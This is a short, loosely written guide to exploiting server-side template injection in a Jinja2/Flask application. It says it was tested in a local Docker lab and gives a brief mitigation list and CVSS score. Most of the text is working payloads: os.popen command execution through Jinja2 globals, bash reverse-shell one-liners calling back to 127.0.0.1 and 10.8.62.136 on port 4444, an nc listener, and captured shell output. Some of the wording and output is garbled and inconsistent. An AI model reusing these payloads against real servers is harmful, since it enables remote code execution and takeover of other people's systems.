 SSTI payloads for exploit 
This payloads real using in  bug bounty sites
SSTI (Server-Side Template Injection) occurs when user-controlled input is passed directly into a server-side template engine.  
This allows an attacker to break out of the template context and execute OS-level commands.
- Remote Code Execution (RCE)
- Full server compromise
- Reverse shell access
- Sensitive data exposure

1. Find user-controlled field rendered by the template engine.
2. Inject simple payload: {{7*7}} → returns 49 → SSTI confirmed.
3. Invoke the __globals__ to access Python builtins.
4. Use popen() to execute OS commands.
5. Trigger reverse shell.



- Do not render user input inside templates.
- Use allowlist-based template variables.
- Sandbox the template engine.
- Escape user input server-side.
- Apply WAF rules for template injection patterns.


CVSS Score: 9.8 (Critical)
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


Environment: Local Docker-based vulnerable Flask app (Jinja2)



for learning whomai notice on server

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read() }}
result
uid=33(www-data) gid=33(www-data) groups=33(www-data)

{{ cycler.__init__.__globals__.os.popen("id").read() }}
Result
uid=33(www-data) gid=33(www-data) groups=33(www-data)

So for earnt reverse shell in site endpoint 
and we using that's payloads reverse shell with Burpsuite or on endpoint 

{{ self...popen("bash -c \"bash -i >/dev/tcp/127.0.0.1/4444 0>&1\"").read() }}'     
and 
nc - nlvp 4444
Connection received on 127.0.0.1:4444
www-data@victim:/var/www/html$

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux victim 5.15.0-79 x86_64

Files in current directory:
index.php
config.php
upload/


{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/10.8.62.136/4444 0>&1"').read() }}




[+] Connection received from 10.10.10.50:53922 → 10.8.62.136:4444

bash: no job control in this shell
www-data@victim:/var/www/html$

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux victim 4.19.0-21-amd64 x86_64 GNU/Linux

Current working directory:
/var/www/html

Files:
index.php
app.py
templates/
static/



